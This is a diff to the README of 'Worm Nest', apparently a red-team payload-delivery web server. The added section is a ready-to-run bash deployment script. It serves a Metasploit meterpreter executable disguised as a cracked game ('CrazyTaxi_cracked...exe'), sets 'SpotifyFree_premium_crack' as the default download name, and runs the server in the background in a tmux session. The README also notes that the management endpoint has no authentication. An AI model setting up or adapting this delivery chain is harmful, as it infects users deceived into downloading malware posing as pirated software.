@@ -62,9 +62,47 @@ Hence `ClientDesktopApp.apk` will be placed in the `"Content-Disposition" HTTP H
 ### For *Cobalt Strikers*
 Generating payloads from the CS client directly to the (remote) *Worm Nest* deployment is as simple as [`sshfs`](https://github.com/libfuse/sshfs) to that served directory (`SRV_DIR`). People tend to forget that `scp` is by far NOT THE ONLY WAY!
 
+## A Simple Deployment Scenario
+
+##### wormnest.sh
+```bash
+#!/bin/bash
+
+# Generate a big and random Management URI
+# Bash-Fu taken from https://unix.stackexchange.com/questions/230673/how-to-generate-a-random-string
+export MANAGE_URL_DIR="$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')"
+echo "$MANAGE_URL_DIR" > $HOME/wormnest_management.key
+
+export REDIRECT_URL="https://google.com"
+export DEFAULT_FILENAME="SpotifyFree_premium_crack" # No file extension here if USE_ORIGINAL_EXTENSION is set!
+
+apt update && apt install -y python3 git # Let's assume Debian
+
+git clone https://github.com/operatorequals/wormnest -b <some_tag> --depth 1 # depth 1 for copying just the tagged commit 
+cd wormnest
+pip3 install -r requirements.txt
+echo '{
+  "download_now":{
+    "path":"metasploit/generated/meter_pinning_443.exe",
+    "filename":"CrazyTaxi_cracked_singlefile_by_Raz0r_team_2006.exe"
+  },
+}' > basic_routes.json
+export DEFAULT_PATHS_FILE="basic_routes.json"
+
+mkdir -p ~/generated_payloads/
+export SRV_DIR="$HOME/generated_payloads"
+
+python3 app.py
+```
+##### wormnest_start.sh
+```bash
+#!/bin/bash
+tmux new -s wormnest -d 'bash wormnest.sh'
+```
+Having in mind mass-deployment environments (looking at you [Red Baron](https://github.com/Coalfire-Research/Red-Baron)), such scripts come in handy.
 
 ## Securing your *Worm Nest*!
-There is **no authentication** to use the management endpoint of this service. This effectively means that anyone going under the `/manage/` directory will be able to see, add, delete all URL aliases, and list the whole served directory.
+There is **no authentication** for the management endpoint of this service. This effectively means that anyone going under the `/manage/` directory will be able to *see, add, delete all* URL aliases, and *list the whole served directory*.
 
 Yet, adding authentication, is (at least at this point) out of scope. That's why the `MANAGE_URL_DIR` exists in the first place. A *passwordish* string here will prevent anyone (not able to guess it) to reach the management endpoint. A password in the URL sucks (I now), but combined with some HTTPS (needed in case of actual use), and with no Intercepting HTTP Proxy between your host and the *Worm Nest* deployment you'll be good enough!
 
